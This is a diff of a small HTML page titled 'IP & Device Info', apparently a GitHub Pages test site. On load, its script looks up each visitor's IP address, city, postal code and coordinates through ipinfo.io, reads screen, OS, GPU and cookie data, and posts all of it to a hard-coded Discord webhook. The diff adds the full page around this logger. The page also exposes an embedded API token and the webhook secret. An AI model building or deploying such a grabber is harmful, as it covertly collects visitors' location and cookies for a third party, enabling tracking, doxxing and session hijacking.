@@ -1,63 +1,108 @@
-<!-- ... same HTML up to the script part ... -->
-
-<script>
-    function getGPUInfo() {
-        let gl = document.createElement('canvas').getContext('webgl');
-        if (!gl) return "WebGL not supported";
-
-        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) {
-            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP & Device Info</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
         }
-        return "GPU info not available";
-    }
 
-    fetch('https://ipinfo.io/json?token=eac37d6f8be115')
-        .then(response => response.json())
-        .then(data => {
-            const { ip, city, region, country, postal, loc } = data;
-            const [latitude, longitude] = loc.split(",");
+        h1 {
+            color: #333;
+        }
 
-            const screenWidth = window.screen.width;
-            const screenHeight = window.screen.height;
-            const os = navigator.platform;
-            const gpu = getGPUInfo();
-            const cookies = document.cookie;
+        #info {
+            margin-top: 20px;
+            font-size: 1.2em;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+    <h1>Fucked</h1>
+    <div id="info">
+        <p id="ip">IP Address: </p>
+        <p id="city">City: </p>
+        <p id="region">Region: </p>
+        <p id="country">Country: </p>
+        <p id="zip">Zip Code: </p>
+        <p id="latlong">Latitude, Longitude: </p>
+        <p id="screen">Screen Resolution: </p>
+        <p id="gpu">GPU: </p>
+        <p id="os">Operating System: </p>
+        <p id="cookies">Cookies: </p>
+    </div>
 
-            document.getElementById('ip').innerHTML = `IP Address: ${ip}`;
-            document.getElementById('city').innerHTML = `City: ${city}`;
-            document.getElementById('region').innerHTML = `Region: ${region}`;
-            document.getElementById('country').innerHTML = `Country: ${country}`;
-            document.getElementById('zip').innerHTML = `Zip Code: ${postal}`;
-            document.getElementById('latlong').innerHTML = `Latitude, Longitude: ${latitude}, ${longitude}`;
-            document.getElementById('screen').innerHTML = `Screen Resolution: ${screenWidth}x${screenHeight}`;
-            document.getElementById('os').innerHTML = `Operating System: ${os}`;
-            document.getElementById('gpu').innerHTML = `GPU: ${gpu}`;
+    <script>
+    window.onload = function () {
+        function getGPUInfo() {
+            let gl = document.createElement('canvas').getContext('webgl');
+            if (!gl) return "WebGL not supported";
 
-            const message = {
-                content: `**Device Information**\n\n` +
-                         `**IP Address**: ${ip}\n` +
-                         `**City**: ${city}\n` +
-                         `**Region**: ${region}\n` +
-                         `**Country**: ${country}\n` +
-                         `**Zip Code**: ${postal}\n` +
-                         `**Latitude, Longitude**: ${latitude}, ${longitude}\n` +
-                         `**Screen Resolution**: ${screenWidth}x${screenHeight}\n` +
-                         `**GPU**: ${gpu}\n` +
-                         `**Operating System**: ${os}\n` +
-                         `**Cookies**: ${cookies}\n\n` +
-                         `GitHub Site: https://gordodolo.github.io/test/`
-            };
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+            return "GPU info not available";
+        }
 
-            fetch('https://discord.com/api/webhooks/1340202474971070464/dVWK9yCgV7E5M5NmFiBzBRqguEy9mwHVDxWQ2FuZ94Sl6MPUH4oe8vIgpcoWODKO1bdV', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(message)
+        // Fetch IP address and location info from ipinfo.io API
+        fetch('https://ipinfo.io/json?token=eac37d6f8be115')
+            .then(response => response.json())
+            .then(data => {
+                const { ip, city, region, country, postal, loc } = data;
+                const [latitude, longitude] = loc.split(",");
+
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const os = navigator.platform;
+                const gpu = getGPUInfo();
+                const cookies = document.cookie;
+
+                // Display on page
+                document.getElementById('ip').textContent = `IP Address: ${ip}`;
+                document.getElementById('city').textContent = `City: ${city}`;
+                document.getElementById('region').textContent = `Region: ${region}`;
+                document.getElementById('country').textContent = `Country: ${country}`;
+                document.getElementById('zip').textContent = `Zip Code: ${postal}`;
+                document.getElementById('latlong').textContent = `Latitude, Longitude: ${latitude}, ${longitude}`;
+                document.getElementById('screen').textContent = `Screen Resolution: ${screenWidth}x${screenHeight}`;
+                document.getElementById('os').textContent = `Operating System: ${os}`;
+                document.getElementById('gpu').textContent = `GPU: ${gpu}`;
+                document.getElementById('cookies').textContent = `Cookies: ${cookies}`;
+
+                // Log to console too
+                console.log("Cookies:", cookies);
+
+                // Send data to Discord webhook
+                const message = {
+                    content: `**Device Information**\n\n` +
+                        `**IP Address**: ${ip}\n` +
+                        `**City**: ${city}\n` +
+                        `**Region**: ${region}\n` +
+                        `**Country**: ${country}\n` +
+                        `**Zip Code**: ${postal}\n` +
+                        `**Latitude, Longitude**: ${latitude}, ${longitude}\n` +
+                        `**Screen Resolution**: ${screenWidth}x${screenHeight}\n` +
+                        `**GPU**: ${gpu}\n` +
+                        `**Operating System**: ${os}\n` +
+                        `**Cookies**: ${cookies}\n\n` +
+                        `GitHub Site: https://gordodolo.github.io/test/`
+                };
+
+                fetch('https://discord.com/api/webhooks/1340202474971070464/dVWK9yCgV7E5M5NmFiBzBRqguEy9mwHVDxWQ2FuZ94Sl6MPUH4oe8vIgpcoWODKO1bdV', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                })
+                .then(() => console.log("Sent to Discord"))
+                .catch(err => console.error("Webhook error:", err));
             })
-            .then(response => {
-                console.log('Message sent to Discord');
-            })
-            .catch(error => console.error('Error:', error));
-        })
-        .catch(error => console.log('Error fetching IP:', error));
-</script>
+            .catch(err => console.error("IP info error:", err));
+    };
+    </script>
+</body>
+</html>
